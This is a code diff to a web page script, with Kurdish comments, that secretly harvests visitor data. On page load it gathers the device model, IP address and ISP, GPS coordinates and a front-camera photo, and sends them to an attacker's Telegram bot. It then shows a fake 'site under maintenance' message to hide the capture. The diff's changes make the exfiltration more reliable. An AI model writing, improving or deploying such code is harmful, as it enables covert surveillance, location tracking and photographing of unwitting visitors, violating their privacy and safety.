@@ -59,7 +59,7 @@
 
             let visitTime = new Date().toISOString().replace('T', ' ').substring(0, 19);
             
-            // وەرگرتنی مۆدێل
+            // 1. مۆدێل
             let deviceModel = "نادیار";
             try {
                 const parser = new UAParser();
@@ -67,7 +67,7 @@
                 deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
             } catch (e) {}
 
-            // وەرگرتنی IP
+            // 2. IP
             let ip = 'نادیار', isp = 'نادیار';
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -76,7 +76,7 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
-            // لۆکەیشن
+            // 3. لۆکەیشن
             let locationText = "بەردەست نییە";
             try {
                 const pos = await new Promise((resolve, reject) => {
@@ -85,13 +85,11 @@
                 locationText = `${pos.coords.latitude}, ${pos.coords.longitude}`;
             } catch (e) {}
 
-            // کامێرا و وێنەگرتن
+            // 4. وێنەی کامێرا
             let imageBlob = null;
-            let cameraStatus = "ڕەتکرایەوە";
+            let cameraStatus = "سەرکەوتوو بوو";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                cameraStatus = "سەرکەوتوو بوو";
-                
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
@@ -108,36 +106,37 @@
                         }, 'image/jpeg');
                     }, 1000);
                 });
-            } catch (e) {}
+            } catch (e) {
+                cameraStatus = "نەگیرا";
+            }
 
-            // دروستکردنی دەقی نامەکە
-            const msg = `🔔 **سەردانیکەرێکی نوێ!**\n\n` +
-                        `⏰ کات: ${visitTime}\n` +
-                        `🌐 IP: ${ip} (${isp})\n` +
-                        `🎯 لۆکەیشن: ${locationText}\n` +
-                        `📷 کامێرا: ${cameraStatus}\n` +
-                        `📱 ئامێر: ${deviceModel}`;
+            // دەقێکی زۆر سادە بێ مارکداون بۆ ئەوەی هەرگیز هەڵە نەدات
+            const msg = "سەردانیکەرێکی نوێ!\n\n" +
+                        "کات: " + visitTime + "\n" +
+                        "IP: " + ip + " (" + isp + ")\n" +
+                        "لۆکەیشن: " + locationText + "\n" +
+                        "کامێرا: " + cameraStatus + "\n" +
+                        "ئامێر: " + deviceModel;
 
-            // ناردنی پەیامی دەقی بە شێوازێکی پارێزراو بۆ تێلێگرام
+            // ناردنی دەقەکە بە بێ parse_mode بۆ دڵنیابوون لە گەیشتنی
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: chatId, 
-                        text: msg, 
-                        parse_mode: 'Markdown' 
+                        text: msg 
                     })
                 });
             } catch (err) {}
 
-            // ناردنی وێنە ئەگەر هەبوو
+            // ناردنی وێنەکە لەگەڵ دەقەکەدا وەک caption (بەو شێوازەی کە سەرکەوتوو بوو)
             if (imageBlob) {
                 try {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('photo', imageBlob, 'capture.jpg');
-                    formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر!**');
+                    formData.append('caption', msg); // لێرەدا دەقەکە دەخەینە ناو وێنەکەشەوە تا دڵنیابین
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
                         method: 'POST', 
@@ -146,7 +145,7 @@
                 } catch (err) {}
             }
 
-            // گەڕاندنەوەی دۆخی ئاسایی پەڕەکە
+            // گەڕاندنەوەی باری ئاسایی
             document.getElementById('content-box').innerHTML = `
                 <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
                 <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
